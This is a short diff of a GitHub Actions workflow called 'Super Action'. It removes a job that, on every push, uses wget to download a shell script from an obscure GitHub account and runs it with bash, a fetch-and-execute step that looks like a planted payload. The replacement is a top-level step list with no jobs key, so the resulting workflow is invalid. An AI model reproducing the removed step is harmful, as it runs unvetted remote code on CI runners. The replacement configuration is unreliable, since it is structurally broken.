@@ -5,16 +5,10 @@ name: Super Action
 on:
     push
 
-jobs:
-    # The job that will use
-    super-job:
-        runs-on: ubuntu-18.04
-        container:
-            image: dazz111/ubuntu-sdk:build
-        steps:
-            - name: super-step
-              shell: bash
-              run: |
-                apt-get install wget -y
-                wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh
-                bash build.sh
+- uses: addnab/docker-run-action@v3
+  with:
+    image: docker:latest
+    shell: bash
+    run: |
+      echo "first line"
+      echo "second line"
